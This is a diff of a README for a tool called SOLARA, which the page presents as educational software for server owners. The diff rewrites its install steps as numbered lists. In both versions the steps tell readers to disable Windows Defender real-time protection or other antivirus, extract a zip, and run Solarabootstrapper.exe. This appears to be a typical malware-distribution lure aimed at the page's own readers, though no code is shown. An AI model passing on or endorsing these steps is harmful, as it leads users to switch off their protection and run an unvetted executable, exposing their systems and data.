@@ -25,17 +25,17 @@ SOLARA is for educational purposes only, intended to help server owners develop 
 
 First, download the zip file. Next, temporarily disable your antivirus software or the real-time protection feature in Windows Defender to avoid any potential interference.
 
-how to download solara zip file:
+### How to Download the Solara Zip File:
 
-```
- click code on the side of search file > then go to local and click download zip.
-```
+1. Click the "Code" button located next to the file search bar.
+2. Select "Local" and then click "Download ZIP."
 
-how to disable antivirus in windows defender:
+### How to Disable Antivirus in Windows Defender:
 
-```
-               windows defender > virus and threat protection > manage settings > disable real-time protection.
-```
+1. Open Windows Defender.
+2. Navigate to "Virus & threat protection."
+3. Click on "Manage settings."
+4. Disable "Real-time protection."
 After that, unzip the file using WinRAR or 7-Zip. Once extracted, navigate to the files and double-click on Solarabootstrapper.exe. With this, the process is complete.
 
 Take a look at the source code for more details.
